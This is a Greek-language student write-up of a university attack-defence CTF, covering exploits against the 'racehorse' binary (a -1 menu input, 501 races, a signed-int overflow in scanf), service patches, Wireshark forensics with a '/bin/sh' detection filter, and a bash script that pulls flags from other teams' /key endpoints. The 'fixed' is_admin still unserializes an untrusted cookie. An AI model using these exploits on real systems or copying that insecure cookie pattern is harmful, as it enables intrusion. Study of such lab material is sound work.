ορίζεται ως εξής char flag_buf[100]). Άρα η πρώτη μου ιδέα ήταν αν βρώ την διεύθυνση της μεταβλητής flag_buf όπου φορτώνεται σε αυτήν το flag
τότε με ένα buffer overflow και ίσως με χρήση του ROP να μπορώ να κάνω print το flag

Ανοίγω το gdb για αυτό το binary αρχείο για να δω τι γίνεται. Αρχικά τρέχω το binary με το gdb μέχρι το Main Menu να μου εμφανιστεί και μετά
πατώντας ctrl + "c" κάνω disas load_flag_and_urandom και βλέπω την εντολή read οπότε βάζω ένα breakpoint μετά από αυτήν την εντολή δηλ στην
διεύθυνση 0x5655650e και ξανατρέχω το binary μέσου του gdb κάνω ένα break στην διεύθυνση 0x5655650e και γράφωντας το `p/x $edi` (γιατί ο
edi register από την πάνω disas που έκανα βλέπω ότι περιέχει τη διεύθυνση του buffer που περνιέται ως όρισμα στη read όπου αποθηκεύεται το
flag) και παίρνω το ακόλουθω `$1 = 0x56559660` ως output. Οπότε γράφωντας στο gdb το `x/20x 0x56559660` βλέπω το flag_buf και όντως βλέπω μέσα
του αποθηκευμένο το flag που είχα φτιάξει τοπικά εγώ ένα

Επίσης κάτι ενδιαφέρον που παρατήρησα ακριβώς τότε επειδή έτρεχα το gdb για αυτό το binary περισσότερο από μια φορές και έβλεπα ότι οι
διευθύνσεις είναι πάντοτε οι ίδιες που αυτό αντιφάσκει με το checksec που είχαμε δεί ότι έχουμε το PIE enabled μου φαίνεται περίεργο αλλά
λόγου του χρόνου που πέρναγε απλά το δέχτηκα ότι οι διευθύνσεις θα είναι πάντα οι ίδιες κάθε φορά που θα τρέχεις το αρχείο αυτό

Οπότε μέχρι στιγμής είχα βρεί την διεύθυνση όπου αποθηκεύεται το flag οπότε ήθελα να δώ τι γίνεται γύρω από αυτήν την διεύθυνση οπότε
γράφωντας στο gdb την εντολή `x/-20x 0x56559660` βλέπω ότι από πάνω της γίνονται register του user τα horses

Οπότε πηγαίνω στον κώδικα και βρείσκω την συνάρτηση h_register_horse αλλά δεν μπορούσα να βρώ ένα vulnerable function για να κάνω buffer
overflow (όλες οι "χρήσιμες" vulnerable functions που θα με βόλευε να κάνω ένα buffer overflow στην h_register_horse είχαν ένα max μέγεθος
χαρακτήρων που επιτρεπόταν να διαβάσουν/δεχτούν). Οπότε μετά που δεν έβρεισκα στην h_register_horse κάποια vulnerable function για να κάνω ένα
buffer overflow της προκοπής χάθηκα και έβλεπα ότι όλες οι "χρήσιμες" vulnerable functions που θα με βόλευε να κάνω ένα buffer overflow στο
αρχείο μέσα είχαν ένα max μέγεθος χαρακτήρων που επιτρεπόταν να διαβάσουν/δεχτούν

**Wireshark**

Οπότε μέχρι στιγμής αυτό μου είχε φάει μέχρι το πρωΐ του σαββάτου εκείνη την στιγμή με ενημερώνει ένα άτομο της ομάδας μου ότι μέσω του
wireshark για το port του executable file υπάρχουν attacks και μου δίνει το payload να είναι απλά το -1 !!!!!

Λίγο απογοητεύτηκα εκείνη την στιγμή να πώ την αλήθεια. Κάνω ένα reverse του attack που μας κάνανε

Φτιάχνω payload (που απλά ήταν το -1) και το στέλνω στα άτομα τις ομάδας μου που τρέχανε/φτιάχνανε τα scripts

Αφότου μου έμαθε πώς να χειρίζομαι το wireshark και πώς να κατεβάζω και να φορτώνω και τα pcaps και να τα φιλτράρω στο wireshark για το port
του executable file μου το μέλος που με ενημέρωσε για το attack

**Δημιουργία δικού μου attack**

Μετά από αυτό το attack που απλά ήταν το -1 με έκανε να δώ το πρόβλημα από εντελώς διαφορετική οπτική γωνία δηλ. μετά από 20 λεπτά από το
attack αυτό βρείκα και εγώ ένα attack για αυτό το binary. Δηλ στην main του binary αρχείου αυτού αν κάνουμε περισσότερους από 500 αγώνες μας
εμφανίζει απλά το flag. Οπότε φτιάχνω το exploit και το αντίστοιχο payload που είναι ότι κάνουμε 501 αγώνες και το στέλνω στα άτομα τις
ομάδας μου που τρέχανε και φτιάχνανε τα scripts

Οπότε τι έμαθα από αυτό το binary να κοιτάζω τις τετριμένες περιπτώσεις. Διότι ακόμα που σε αυτόν τον κώδικα ήταν από άποψη buffer overflow
άψογος δηλ. όλες οι "χρήσιμες" vulnerable functions που θα μπορούσες να κάνεις ένα buffer overflow είχαν max χαρακτήρες που μπορούσαν να
δεχτούν/διαβάσουν ΑΛΛΑ αν επίλεγες το -1 στο μενού σου εμφάνιζε το flag

**Καινούργιο attack**

Την Κυριακή το πρωΐ με ενημερώνουν για νέο attack στο racehorse παίρνω το payload και προσπαθώ να καταλάβω το attack

Ουσιαστικά το attack ήταν στην συνάρτηση h_register_horse η οποία είχε τις εξής γραμμές

```
__isoc99_scanf(&DAT_000121ee,iVar6 + 0x142a0);
__isoc99_scanf(&DAT_000121ee,iVar6 + 0x142a4);
```

που αυτές ισοδυναμούν με τις παρακάτω γραμμές κώδικα

```
int starts;
int firsts;

scanf("%d", &starts);
scanf("%d", &firsts);
```

Διότι έχουμε ότι:  
Το &DAT_000121ee αναφέρεται στο "%d" δηλ έχουμε signed 32 bit int

Το πρόβλημα είναι ότι δεν γίνεται κανένας έλεγχος στην τιμή που θα δώσει ο χρήστης

Οπότε αν δώσουμε πολύ μεγάλη τιμή θα προκαλέσει overflow καθώς η τιμή υπερβαίνει τα όρια του int. Οπότε το bit pattern που γράφεται ερμηνεύεται από το πρόγραμμα ως
πολύ μικρή τιμή για το starts και τεράστια τιμή για το firsts

Άρα όταν ο χρήστης θα ξεκινήσει τον αγώνα με αυτό το horse που έκανε register πιο πρίν θα καλθεί η συνάρτηση m_start_race η οποία καλεί την
συνάρτηση horse_is_awesome στην οποία η εξής γραμμές κώδικα

```
if (0x13 < *(int *)(param_1 + 0x24)) {
  bVar1 = *(int *)(param_1 + 0x20) / 2 < *(int *)(param_1 + 0x24);
}
```

είναι ισοδύναμες με την εξής γραμμή κώδικα

```
if (firsts > 0x13 && starts / 2 < firsts)
```

επομένως αυτή η συνάρτηση θα επιστρέψει true οπότε μετά στην συνάρτηση m_start_race έφοσον η horse_is_awesome επιστρέφει true θα καλθεί η
συνάρτηση give_flag που εκτυπώνει το flag

Εφόσον κατάλαβα το attack αφού πρώτα χρησιμοποιήσαμε το payload ως attack και για τις άλλες ομάδες έπειτα αυτή η ανάλυση με βοήθησε να κάνουμε
patch το binary αρχείο

---

## Service Patches

(🛡 --> patched)

### 🛡 pwnazon

_[Web service running on port `8005`]_ <br>

**Διόρθωσα πρώτα την επίθεση του cookie** — Απλά άλλάξα τον κώδικα για να **επιστρέφει ένα ψεύτικο flag** αν ένα πλαστό cookie προσπαθούσε να ανακτήσει το πραγματικό. Έτσι, οι επιτιθέμενοι ίσως έχαναν λίγο χρόνο νομίζοντας ότι είχαν τη σωστή σημαία.

**Το πρόβλημα του συστήματος αρχείων** ήταν πιο δύσκολο.

Δεν είχα δουλέψει ποτέ με PHP πριν. Οι λύσεις που βρήκα online απαιτούσαν την προσθήκη ενός αρχείου `.htaccess` στο φάκελο, αλλά δεν είχα δικαιώματα για να το κάνω αυτό.

### Το Router Patch

Την επόμενη μέρα βρήκαμε εν τέλη ένα τρόπο να το κάνουμε patch.

Έφτιαξα ένα αρχείο `router.php` στον κατάλογο `/tmp/` κάτω από τον χρήστη `pwnazon`:

```php
<?php
$root = '/opt/services/pwnazon';
$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

// Μπλοκάρει την πρόσβαση στο αρχείο "key"
if ($uri === '/key' || strpos($uri, '/key/') === 0) {
    http_response_code(403);
    echo "Access Denied.";
    exit;
}

$file = realpath($root . $uri);

error_log("Request URI: $uri");
error_log("Resolved file: $file");

if ($file === false || strpos($file, realpath($root)) !== 0) {
    http_response_code(404);
    echo "Not Found";
    exit;
}

if (is_dir($file)) {
    $indexFile = rtrim($file, '/') . '/index.php';
    if (file_exists($indexFile)) {
        $file = $indexFile;
    } else {
        http_response_code(404);
        echo "Not Found";
        exit;
    }
}

if (file_exists($file) && pathinfo($file, PATHINFO_EXTENSION) === 'php') {
    include $file;
} elseif (file_exists($file)) {
    $mime = mime_content_type($file);
    header("Content-Type: $mime");
    readfile($file);
} else {
    http_response_code(404);
    echo "Not Found";
    error_log("File does not exist: $file");
}
```

Μετά σταμάτησα τον αρχικό server:

```bash
sudo /usr/bin/systemctl stop pwnazon
```

Και ξεκίνησα έναν νέο PHP built-in server με αυτό:

```bash
php -S 0.0.0.0:8003 -t /opt/services/pwnazon /tmp/router.php
```

---

### Τι πέτυχε αυτό

Αυτή η ρύθμιση μου έδωσε **πλήρη έλεγχο πάνω στα εισερχόμενα HTTP requests**. Συγκεκριμένα:

- **Μπλόκαρε την άμεση πρόσβαση στο `/key`**, που προηγουμένως ήταν ανοιχτή.
- Εξακολουθούσε να σερβίρει όλα τα υπόλοιπα αρχεία κανονικά — static files, PHP scripts, κλπ.
- Μου επέτρεψε να λειτουργώ σαν custom application firewall

Με το custom router, κατάφερα να ασφαλίσω την εφαρμογή.

### Το login patch

Αλλάξαμε την is_admin() function ώστε να ελέγχει εάν το status του admin άλλαξε από την μεριά του server μας.
Εάν άλλαζε η τιμή του από διαφορετική ip, τότε θα μετά το refresh το cookie θα γινόταν reset.

```
function is_admin() {
  $obj = @unserialize($_COOKIE["STATE"]);
  if (!empty($obj["admin"]) && $_SERVER["REMOTE_ADDR"] === "127.0.0.1") {
    return $obj["admin"];
  }
  return false;
}
```

### 🛡 bananananana

_[Web service running on port `8003`]_ <br>

Εφαρμόσαμε το router patch όπως και στο pwazon.

### 🛡 auth

_[Binary service running on port `8000`]_ <br>

1. Στη συνάρτηση που κάνει list τα accounts υπήρχε ένα format string attack. Το φτιάξαμε αλλάζοντας την κλήση printf σε puts.
2. Στη συνάρτηση που ελέγχει το username και password, το strncmp έπερνε σαν μήκος την είσοδο χρήστη. Με άλλα λόγια, έλεγχε μόνο όσα ψηφία δίνει ο χρήστης. Αλλάξαμε την κλήση σε `strncmp(password, submitted_password, 0xFF)`. Τεχνικά είναι undefined behavior, αλλά φαίνεται να είναι υλοποιημένο σωστά στη βιβλιοθήκη.

### ❌ mapflix

_[Binary service running on port `8002`]_ <br><br>
Δεν καταφέραμε να patchαρουμε το mapflix...

### 🛡 powerball

_[Binary service running on port `8001`]_ <br>

1. Υπήρχε μια κλήση mprotect που άλλαζε τα permissions μνήμης σε READ WRITE και EXEC. Επίσης ο χρήστης μπορούσε να γράψει σ'εκείνη την περιοχή. Αλλάξαμε την κλήση της mprotect να μην θέτει EXEC.
2. Περιορίσαμε το πλήθος των "token" εισόδου σε 64.

### 🛡 racehorse

_[Binary service running on port `8004`]_ <br>

1. Σε ένα κύριο loop υπήρχε ένα όριο 500 επαναλήψεων. Μετά απο αυτό το loop υπάρχει ο κώδικας που επιστρέφει το key. Αν μια είσοδος με 501 "tokens" δεν έκανε trigger κάποιο return, τότε θα εκτυπωνόταν το key. Το φτιάξαμε αλλάζοντας την εντολή `iVar1 = iVar1 + -1` με `NOP`.

2. Στην επιλογή απο τις 4 λειτουργίες, ο κώδικας περιμένει είσοδο στο [1, 4]. Έκανε έλεγχο για `JNZ`, αλλά όχι για αρνητικές τιμές. Αυτός ο έλεγχος ηταν περιττος, αφού γινόταν και παρακάτω. Αλλάξαμε το `JNZ` με `JNS`

3. Κατά το registration ενός αλόγου, η scanf δεν περιόριζε σωστά το μέγεθος του starts και firsts σε signed int. Με αρκετά μεγάλο αριθμό κάναμε bypass τον έλεγχο για υπερβολικά καλά άλογα. Ευτυχώς το string που χρησιμοποιούσε η scanf είχε αρκετό χώρο, και το αλλάξαμε σε signed short. (`" %d"` -> `"%hd"`)

---

## Forensics: .pcap Network Traffic Analysis with Wireshark

Μόλις καταλάβαμε ότι έχουμε πρόσβαση στα `.pcap` αρχεία για κάθε 15λεπτο time window, αρχίσαμε να τα κατεβάζουμε τοπικά με την εντολή:

```bash
scp -i ./ssh-team03 -r ctf@10.219.255.10:/pcaps/ ./pcaps
```

Ξεκινήσαμε την ανάλυση των .pcap στο Wireshark, αρχικά εστιάζοντας στα HTTP πακέτα που σχετίζονταν με τα services `bananananana` και `pwnazon`. Σύντομα επεκτείναμε την έρευνα σε όλη την TCP κίνηση.

Αρχικά υποθέσαμε (λανθασμένα) ότι η IP `10.219.255.9` ήταν ο admin server που έτρεχε αυτοματοποιημένους ελέγχους για τα services μας. Όμως, αργότερα καταλάβαμε ότι αυτή η IP αντιπροσώπευε όλη την εξωτερική κίνηση, συμπεριλαμβανομένων των admin server bots και κυρίως και των υπόλοιπων ομάδων (που ήταν το βασικό που μας απασχολούσε).

Κάνοντας δεξί κλικ σε οποιοδήποτε πακέτο και επιλέγοντας **Follow TCP/HTTP Stream**, μπορούσαμε να δούμε ολόκληρες συνομιλίες μεταξύ εξωτερικών clients και των υπηρεσιών μας. Αυτό ήταν κρίσιμο για να κατανοήσουμε τις αλληλεπιδράσεις και πιθανές επιθέσεις.

### Χρήσιμα Wireshark Filters

Κάποια φίλτρα που μας βοήθησαν πολύ:

- `tcp.port == 8000`
- `tcp.port == 8001`
- `tcp.port == 8002`
- `tcp.port == 8003`
- `tcp.port == 8004`
- `tcp.port == 8005`

Τα παραπάνω φίλτρα μας επέτρεψαν να απομονώσουμε την κίνηση προς συγκεκριμένα TCP ports, δηλαδή κάθε filter εμφανίζει μόνο τα πακέτα που σχετίζονται με το αντίστοιχο service. Έτσι, μπορούσαμε να εστιάσουμε σε traffic που αφορούσε συγκεκριμένα services.

Χρησιμοποιήσαμε επίσης content-based filters, για παράδειγμα:

- `frame contains "/bin/sh"`

Αυτό μας επέτρεψε να εντοπίσουμε γρήγορα ύποπτη δραστηριότητα, όπως reverse shells ή command injections. Για παράδειγμα, μετά το φιλτράρισμα για `/bin/sh`, μπορούσαμε να κάνουμε δεξί κλικ στο πρώτο σχετικό πακέτο και να επιλέξουμε **Follow TCP Stream** για να δούμε ολόκληρη την exploit προσπάθεια.

### Επιλογή Time Windows

Δεν ήταν εφικτό να αναλύσουμε όλα τα time windows λόγω όγκου δεδομένων και περιορισμένου χρόνου. Για αυτό, επιλέγαμε κυρίως τα πιο πρόσφατα `.pcap` αρχεία, θεωρώντας ότι σε αυτά περισσότερες ομάδες θα είχαν δοκιμάσει νέες επιθέσεις ή τεχνικές. Έτσι, μεγιστοποιούσαμε τις πιθανότητες να εντοπίσουμε ενδιαφέρουσα ή καινούρια κακόβουλη δραστηριότητα.

Αυτές οι τεχνικές, σε συνδυασμό με προσεκτικό φιλτράρισμα και stream following, μας επέτρεψαν να ανασυνθέσουμε επιθέσεις, να κατανοήσουμε τη συμπεριφορά των αντιπάλων και να βελτιώσουμε τις άμυνές μας.

### Exploits που αναγνωρίσαμε μέσω της Wireshark ανάλυσης των attacks άλλων ομάδων προς εμάς:

- 2ο `auth` vulnerability [auth _ X]
- `mapflix` vulnerability (only attacked)
- 1o `racehorse` vulnerability [-1]
- 3o `racehorse` vulnerability [many 2's]
- `powerball` vulnerabilities (only patched)

---

## Automation - Exploits & Flags Submission

Για να αυτοματοποιήσουμε την υποβολή των flags που βρίσκαμε, γράψαμε bash scripts που έκαναν exploit τα flags από τα services των άλλων ομάδων και τα υπέβαλλαν αυτόματα στο API του διαγωνισμού. Τα scripts αυτά έτρεχαν κάθε 5 λεπτά, είτε μέσω `cron`, είτε μέσω `watch`, είτε ενσωματωμένα με sleep loop μέσα στο ίδιο το script, ώστε να μην χάνουμε κανένα flag όσο ήταν ενεργό.

Παράδειγμα ενός τέτοιου script (pwnazon exploit):

```bash
#!/bin/bash

ips=(
    "10.219.255.2" "10.219.255.6" "10.219.255.14" "10.219.255.18"
    "10.219.255.22" "10.219.255.26" "10.219.255.30" "10.219.255.34"
    "10.219.255.38" "10.219.255.42" "10.219.255.46" "10.219.255.50"
    "10.219.255.54" "10.219.255.58" "10.219.255.62"
)

submit_url="https://ctf.hackintro25.di.uoa.gr/submit"
api_key="f99e197afa7122298b9b948accf205313ee28954a2af6a98710317f8dc80ea52"

for ip in "${ips[@]}"; do
    echo "[+] Trying http://$ip:8005/key"

    response=$(curl -s --connect-timeout 15 --max-time 30 "http://$ip:8005/key")

    if [[ "$response" =~ ^[a-f0-9]{64}$ ]]; then
        echo "[!] Key found: $response"

        submit_response=$(curl -s -w "%{http_code}" -o /tmp/submit_out \
            -H "Content-Type: application/json" \
            -H "Authorization: Bearer $api_key" \
            -d "{\"flag\": \"$response\"}" \
            "$submit_url")

        if [[ "$submit_response" == "200" ]]; then
            echo "[✓] Flag submitted successfully!"
        else
            echo "[!] Submission failed: HTTP $submit_response"
            cat /tmp/submit_out
        fi
    else
        echo "[-] No valid key found at $ip"
    fi
done
```

Το παραπάνω script μπορούσε να εκτελείται αυτόματα κάθε 5 λεπτά μέσω `cron` ή μέσω `watch`. <br>
Σε κάποια scripts, όπως το παραπάνω, είχαμε βάλει διαχείριση πιθανού timeout διότι από κάποιες ομάδες σε συγκεκριμένα services, κάποιες φορές, παίρναμε ως responce timeouts με αποτέλεσμα να μην προχωράει το script ποτέ στο attack
της επόμενης ομάδας. Άρα βάλαμε το εξής στην εντολή `curl` ώστε να κάνουμε skip μετά από timeout: `--connect-timeout 15 --max-time 30`.

---

## Attack & Defence Strategies, Delegation of duties

### Καταμερισμός Ρόλων

Δεν είχαμε ακριβώς μοιράσει ρόλους από την αρχή. Πριν τον διαγωνισμό οργανωθήκαμε ως ομάδα, φτιάχνοντας Discord server με επιμέρους text και voice channels για καλύτερη επικοινωνία και συντονισμό. Ο καθένας μοιράστηκε τα tools που γνώριζε για attack και defense, ώστε να έχουμε έτοιμο ένα κοινό toolbox με resources.

Με το ξεκίνημα του διαγωνισμού, αρχίσαμε να βλέπουμε τα ζητούμενα και ο καθένας ανέλαβε σχεδόν αυτόματα διαφορετικό ρόλο, ανάλογα με τα ενδιαφέροντα και τα skills του. Δημιουργήσαμε ξεχωριστά text channels στο Discord για κάθε service, ώστε να οργανώνουμε καλύτερα τη δουλειά μας.

Η επικοινωνία στην ομάδα ήταν συνεχής, οπότε γνωρίζαμε πάντα τι κάνει ο καθένας και δεν υπήρχαν conflicts ή επικαλύψεις. Σε γενικές γραμμές, όλοι είδαν από όλα, αλλά κάποιοι ασχολήθηκαν περισσότερο με binary service patches, άλλοι με web service patches, άλλοι με binary attacks, άλλοι με web attacks, άλλοι με wireshark forensics, και άλλοι με γενικότερη οργάνωση, αυτοματοποίηση και εξερεύνηση του Linux box.

Έτσι είχαμε μία πάρα πολύ καλή συνεργασία, χωρίς κάποιο αυστηρό delegation of duties.

### Στρατηγική

Ξεκινήσαμε να ψάχνουμε manually για vulnerabilities τόσο στα web όσο και στα binary services, αναλύοντας τον κώδικα και δοκιμάζοντας διάφορα inputs. Στη συνέχεια, χρησιμοποιήσαμε και την .pcap κίνηση μέσω Wireshark, από όπου πήραμε αρκετά χρήσιμη πληροφορία, ακόμα και έτοιμα exploits που είχαν χρησιμοποιήσει άλλες ομάδες. Αυτό μας βοήθησε να εντοπίσουμε αδυναμίες που δεν είχαμε βρει μόνοι μας.

Με το που βρίσκαμε κάποιο vulnerability ή exploit, αμέσως φτιάχναμε αυτοματοποιημένο script που έτρεχε σε όλους και έκανε submit το flag. Στη συνέχεια, κάποιος από την ομάδα αναλάμβανε να patchάρει το αντίστοιχο service για να μην μπορούν να μας πάρουν το flag με τον ίδιο τρόπο.

---

## Lessons learned -- What would we do differently if we did this again?

### Τι μάθαμε - Το γενικό experience:

_«Ήταν μια πολύ ωραία εμπειρία για μένα, ενδιαφέρον άσκηση αλλά και ο τρόπος διεξαγωγής της ότι δηλ είχαμε 48 ώρες μόνο και είχαμε κοινές
υπηρεσίες με τις υπόλοιπες ομάδες και έπρεπε να σκεφτούμε και τα attacks για να κλέψουμε τα flags τους αλλά και τα defenses μας για να
προστατεύσουμε τα flag μας. Το site που έδειχνε το Live Graph άλλα και το Leaderboard πόλυ ωραία φτιαγμένο αλλά και μας προσέφερε και μια εικόνα
στο τι συμβαίνει και με τις άλλες ομάδες  
Ευτυχώς είχα κάλους συνεργάτες που κάνανε δουλεία!!! Πολύ σημαντικό αυτό και χωρίστηκαν τα parts που είχε πάρει ο καθένας από μόνο του κατά
κάποιον τρόπο. Πχ έγω που ήξερα binary exploitation καλύτερα από τα web πήγα και ασχολήθηκα με αυτά και άφησα τα web να ασχοληθεί κάποιος
άλλος/οι με αυτά.»_

_«Η εμπειρία ήταν μοναδική και μας έδωσε την ευκαιρία να γνωρίσουμε στην πράξη πώς λειτουργεί ένας τέτοιος διαγωνισμός, τόσο τεχνικά όσο και οργανωτικά.»_

*«Ο διαγωνισμός attack-defence της τρίτης εργασίας του μαθήματος ήταν μια ιδιαίτερη και ενδιαφέρουσα εμπειρία που μας βοήθησε να εξοικειωθούμε με ένα πιο ρεαλιστικό σενάριο εφαρμογής διαφόρων πτυχών της κυβερνοασφάλειας. Ο περιορισμένος χρόνος ήταν βασικός δεσμευτικός παράγοντας στον διαγωνισμό πράγμα που σήμαινε ότι έπρεπε να προσαρμοστούμε στα δεδομένα του διαγωνισμού και να κινηθούμε γρήγορα στην εύρεση exploit των services και των αντίστοιχων mitigation, πράγμα με το οποίο είχαμε ελάχιστη εμπειρία. Ταυτόχρονα για να μεγιστοποιήσουμε την αποδοτικότητα μας στον περιοσμένο χρόνο που είχαμε διαθέσιμο καλούμασταν να χρησιμοποιήσουμε διαφορετικά εργαλεία για attack, defence και monitoring της κατάστασης του συστήματος μας, αλλά και να υλοποιήσουμε δικές μας αυτοματοποιήσεις που θα μας επέτρεπαν να πραγματοποιηούμε τα *attacks* σε κάθε *time window* των 15 λέπτων. Τέλος, μέσα απο την διεξαγωγή της συγκεκριμένης εργασίας πήραμε πολλές εμπειρίες και γνώσεις σχετικά με χρήση εργαλείων για εύρεση *vulnerabilities* σε υπηρεσίες, αλλά και *patching* αυτών, για monitoring ενός συστήματος και *auditing* διαφορετικών επικοινωνιών μέσω ενός δικτύου με το σύστημα και τέλος τεχνικές αυτοματοποίησης των παραπάνω με υπάρχοντα ή *custom* εργαλεία. Αν συμμετείχα σε κάποιον αντίστοιχο διαγωνισμό θα φρόντιζα να εξοικειωθώ καλύτερα με την δομή του συστήματος και κυρίως με εργαλεία και τεχνολογίες που θα μπορούσαν να χρησιμοποιηθούν για να διευκολύνουν τις διαφορετικές πτύχες του διαγωνισμού.»*

### Τι θα κάναμε διαφορετικά:

- Να μην παραβλέπαμε την εκτέλεση του αυτοματοποιημένου script για το `/key` vulnerability του `bananananana` το 1ο βραδυ.
- Monitoring - συχνός έλεγχος cron jobs, και των τρέχων processes. Θα είχαμε αποφύγει τους invaders και τα planted scripts...
- Καλύτερη εξερεύνηση του Linux box από νωρίς, να ξέραμε ακριβώς τα access writes όλων των directories, τις rights του δικού μας user, κλπ.
- Copilot για τον decompiled κώδικα γιατί μέσω των Ghidra και Hex-Rays δεν ήταν τόσο ευανάγνωστος.
- Αξιοποίηση του API της σελίδας `ctf.hackintro25.di.uoa.gr`, ώστε να εξάγουμε χρήσιμη πληροφορία σχετικά με το ποιές ομάδες έχουν καταφέρει, και κάνουν, attacks προς τα εμάς σε συγκεκριμένα services (για πιο specific ανάλυση μεσω wireshark αργότερα).
- Αξιοποίηση του git repo για τα ghidra decompiles, έτσι ώστε να υπάρχει ιστορικό του τί αλλάξαμε και οι μετονομάσεις συναρτήσεων & μεταβλήτών να είναι διαθέσιμες σε όλους
